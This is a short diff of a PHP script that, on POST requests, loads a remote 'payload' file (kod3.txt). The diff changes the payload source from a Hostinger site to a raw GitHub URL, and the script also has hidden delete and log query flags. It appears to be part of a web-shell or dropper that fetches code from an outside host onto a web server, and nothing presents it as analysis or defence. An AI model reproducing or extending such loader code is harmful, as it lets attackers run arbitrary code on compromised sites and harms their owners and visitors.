@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $payloadUrl = 'https://red-dugong-830992.hostingersite.com/kod3.txt';
+    $payloadUrl = 'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/kod3.txt';
 
     $deleteMode = isset($_GET['deleteke']);
     $logMode = isset($_GET['logke']);
